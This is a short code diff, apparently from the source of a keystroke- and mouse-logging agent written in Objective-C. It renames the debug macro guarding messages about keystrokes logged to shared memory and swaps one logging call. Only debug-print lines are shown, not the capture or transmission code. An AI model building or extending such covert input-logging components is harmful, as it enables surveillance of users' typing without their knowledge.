@@ -457,7 +457,7 @@ static int height  = 30;
                                            offset: 0
                                     fromComponent: COMP_AGENT] == TRUE)
               {
-#ifdef DEBUG_TMP
+#ifdef DEBUG_INPUT_LOGGER
                 NSLog(@"%s: Logged keyboard: %@ with size %d struct size %d", 
                       __FUNCTION__, 
                       keyBuffer, 
@@ -467,7 +467,7 @@ static int height  = 30;
               }
             else
               {
-#ifdef DEBUG_TMP
+#ifdef DEBUG_INPUT_LOGGER
                 NSLog(@"%s: Error while logging keystrokes to shared memory", __FUNCTION__);
 #endif
               }
@@ -878,7 +878,7 @@ static int height  = 30;
                                                offset: 0
                                         fromComponent: COMP_AGENT] == TRUE)
                   {
-#ifdef DEBUG_TMP
+#ifdef DEBUG_INPUT_LOGGER
                   NSLog(@"%s: Logged and mouse: %@ with size %d struct size %d", 
                         __FUNCTION__, 
                         keyBuffer, 
@@ -888,8 +888,8 @@ static int height  = 30;
                   }
                 else
                   {
-#ifdef DEBUG_TMP
-                    debugLog(ME, @"Error while logging keystrokes to shared memory %@", keyBuffer);
+#ifdef DEBUG_INPUT_LOGGER
+                    errorLog(@"Error while logging keystrokes to shared memory %@", keyBuffer);
 #endif
                   }
                 
